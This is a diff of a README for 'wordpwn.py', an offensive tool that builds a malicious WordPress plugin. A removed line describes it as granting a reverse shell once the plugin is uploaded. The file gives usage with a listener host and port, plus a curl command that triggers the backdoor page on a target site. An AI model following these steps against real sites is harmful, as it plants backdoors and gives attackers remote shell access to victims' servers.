@@ -1,5 +1,5 @@
 # malicious-wordpress-plugin
-Simply generates a wordpress plugin that will grant you a reverse shell once uploaded. I recommend don't installing Kali Linux, as msfvenom is not used to generate the payload.
+Simply generates a malicious wordpress plugin without msfvenom.
 
 #### Usage Example
 ```sh
@@ -12,13 +12,13 @@ __        __            _
                          |_|
 
 
-Usage: wordpwn.py [LHOST] [LPORT] [HANDLER]
-Example: wordpwn.py 192.168.0.6 8888 Y
+Usage: wordpwn.py [LHOST] [LPORT]
+Example: wordpwn.py 192.168.0.6 8888
 ```
 
 Finally, visist the backdoor page `wetw0rk_maybe.php`.
 
 ```
-curl http://[target]/wp-content/plugins/malicous-1/wetw0rk_maybe.php
+curl http://[target]/wp-content/plugins/malicous/wetw0rk_maybe.php
 ```
 
